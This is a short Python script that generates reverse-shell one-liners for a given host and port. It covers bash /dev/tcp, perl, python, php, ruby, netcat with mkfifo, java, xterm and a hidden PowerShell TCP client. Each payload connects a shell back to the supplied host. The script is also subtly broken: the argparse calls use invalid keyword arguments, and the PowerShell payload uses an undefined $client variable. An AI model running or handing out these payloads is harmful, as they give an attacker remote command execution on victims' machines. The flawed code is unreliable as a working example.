# Generate reverse shell from host and port
# Usage: python3 revshellgen.py <host> <port> <type>
import argparse

def generate_revshell_payload(host, port, type):
    if type == "bash":
        return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
    elif type == "perl":
        return f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    elif type == "python":
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif type == "php":
        return f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    elif type == "ruby":
        return f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    elif type == "nc":
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
    elif type == "java":
        return f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
    elif type == "xterm":
        return f"xterm -display {host}:1"
    elif type == "powershell":
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate reverse shell payload")
    parser.add_argument(
        host="host",
        help="Host to connect back to",
    )
    parser.add_argument(
        port="port",
        help="Port to connect back to",
    )
    parser.add_argument(
        type="type",
        help="Type of reverse shell",
    )

    args = parser.parse_args()
    print(generate_revshell_payload(args.host, args.port, args.type))